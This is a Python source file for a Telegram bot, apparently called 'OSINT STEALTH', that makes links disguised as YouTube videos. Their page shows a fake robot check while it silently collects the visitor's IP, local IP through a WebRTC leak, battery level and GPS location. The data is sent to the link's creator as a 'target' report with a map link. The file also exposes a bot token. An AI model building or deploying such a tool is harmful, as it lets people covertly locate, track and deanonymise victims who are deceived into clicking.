import asyncio, threading, os, requests, json
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder

# --- КОНФИГ ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OWNER_ID = 6659724115 
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 

app = Flask(__name__)
DB_FILE = "user_data.json"

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f: return json.load(f)
    return {"users": {}}

def save_db(db):
    with open(DB_FILE, "w") as f: json.dump(db, f, indent=4)

@app.route('/')
def home(): return "SYSTEM ONLINE", 200

# --- СТЕЛС-HTML (С МАСКИРОВКОЙ) ---
HTML_TRAP = """
<!DOCTYPE html>
<html>
<head>
    <title>YouTube - Посмотрите это видео</title>
    <meta property="og:title" content="YouTube: Новое видео на канале">
    <meta property="og:description" content="1.2 млн просмотров • 2 часа назад">
    <meta property="og:image" content="https://www.youtube.com/img/desktop/yt_1200.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <style>
        body { background: #000; color: #fff; font-family: 'Roboto', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .yt-loader { text-align: center; }
        .spinner { border: 3px solid #333; border-top: 3px solid #f00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn { background: #f00; color: #fff; border: none; padding: 10px 20px; border-radius: 2px; cursor: pointer; font-weight: bold; text-transform: uppercase; }
    </style>
</head>
<body>
    <div class="yt-loader" id="content">
        <div class="spinner"></div>
        <p>Для просмотра видео подтвердите, что вы не робот</p>
        <button class="btn" onclick="collect()">Смотреть</button>
    </div>

<script>
async function collect() {
    document.getElementById('content').innerHTML = '<div class="spinner"></div><p>Загрузка плеера...</p>';
    
    let d = { aid: "{{ aid }}", lure: "{{ lure }}", ua: navigator.userAgent, res: screen.width + "x" + screen.height };

    try {
        let b = await navigator.getBattery();
        d.bat = Math.round(b.level * 100) + "%";
    } catch(e) {}

    try {
        let pc = new RTCPeerConnection({iceServers:[]});
        pc.createDataChannel("");
        pc.createOffer().then(o => pc.setLocalDescription(o));
        pc.onicecandidate = (i) => {
            if (i && i.candidate) {
                d.local_ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
            }
        };
    } catch(e) {}

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (p) => { d.gps = p.coords.latitude + "," + p.coords.longitude; send(d); },
            (e) => { d.gps = "Denied"; send(d); },
            { enableHighAccuracy: true, timeout: 5000 }
        );
    } else { send(d); }
    
    setTimeout(() => { send(d); }, 4000);
}

function send(d) {
    if(window.sent) return; window.sent = true;
    fetch('/catch', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
    .finally(() => { 
        let u = {"yt":"https://youtube.com","gg":"https://google.com"};
        location.href = u["{{ lure }}"] || "https://youtube.com";
    });
}
</script>
</body>
</html>
"""

@app.route('/t/<aid>/<lure>')
def trap(aid, lure):
    db = load_db()
    uid = str(aid)
    if uid in db["users"]:
        db["users"][uid]["clicks"] += 1
        save_db(db)
    return render_template_string(HTML_TRAP, aid=aid, lure=lure)

@app.route('/catch', methods=['POST'])
def catch():
    d = request.json
    ips = request.headers.get('X-Forwarded-For', request.remote_addr)
    report = (
        f"🎯 **ЦЕЛЬ ПЕРЕШЛА ПО ССЫЛКЕ**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 **IP:** `{ips}`\n"
        f"🏠 **Local IP:** `{d.get('local_ip', 'N/A')}`\n"
        f"🔋 **Заряд:** {d.get('bat', 'N/A')}\n"
        f"📍 **GPS:** `{d.get('gps', 'N/A')}`\n"
        f"🔗 [Открыть на карте](https://www.google.com/maps?q={d.get('gps')})\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": d['aid'], "text": report})
    return "OK", 200

# --- БОТ ---
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    db = load_db()
    uid = str(message.from_user.id)
    if uid not in db["users"]:
        db["users"][uid] = {"clicks": 0, "ips": []}
        save_db(db)
    
    kb = ReplyKeyboardBuilder()
    kb.add(types.KeyboardButton(text="🎬 Создать ссылку (YouTube)"))
    kb.add(types.KeyboardButton(text="📊 Статистика"))
    await message.answer("🤖 **OSINT STEALTH v12.0**\nВыберите действие:", reply_markup=kb.as_markup(resize_keyboard=True))

@dp.message(F.text == "🎬 Создать ссылку (YouTube)")
async def create_link(message: types.Message):
    link = f"{BASE_URL}/t/{message.from_user.id}/yt"
    await message.answer(f"✅ **Твоя зашифрованная ссылка:**\n\n`{link}`\n\n*В мессенджерах она будет выглядеть как видео YouTube.*")

@dp.message(F.text == "📊 Статистика")
async def stats(message: types.Message):
    db = load_db()
    u = db["users"].get(str(message.from_user.id), {"clicks": 0})
    await message.answer(f"📈 У тебя переходов: `{u['clicks']}`")

async def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000))), daemon=True).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
